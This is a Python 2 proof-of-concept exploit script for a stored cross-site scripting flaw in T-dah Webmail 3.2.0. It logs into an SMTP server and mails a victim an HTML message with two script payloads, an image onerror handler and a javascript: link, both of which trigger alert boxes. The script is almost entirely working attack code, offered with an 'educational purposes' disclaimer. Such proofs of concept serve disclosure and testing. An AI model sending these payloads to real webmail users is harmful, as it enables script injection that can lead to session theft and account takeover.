import smtplib

print "###############################################"
print "# T-dah Webmail 3.2.0 Stored XSS POC #"
print "# Coded by: Shai rod #"
print "# @NightRang3r #"
print "# http://exploit.co.il #"
print "# For Educational Purposes Only! #"
print "###############################################\r\n"

# SETTINGS

sender = "attacker@localhost"
smtp_login = sender
smtp_password = "qwe123"
recipient = "victim@localhost"
smtp_server = "192.168.1.10"
smtp_port = 25
subject = "T-dah Webmail XSS POC"

# SEND E-MAIL

print "[*] Sending E-mail to " + recipient + "..."
msg = ("From: %s\r\nTo: %s\r\nSubject: %s\n"
% (sender, ", ".join(recipient), subject) )
msg += "Content-type: text/html\n\n"
msg += """<img src='1.jpg'onerror=javascript:alert("XSS-1")>\r\n"""
msg += """<a href=javascript:alert("XSS-2")>Click Me, Please...</a>\r\n"""
server = smtplib.SMTP(smtp_server, smtp_port)
server.ehlo()
server.starttls()
server.login(smtp_login, smtp_password)
server.sendmail(sender, recipient, msg)
server.quit()
print "[+] E-mail sent!"

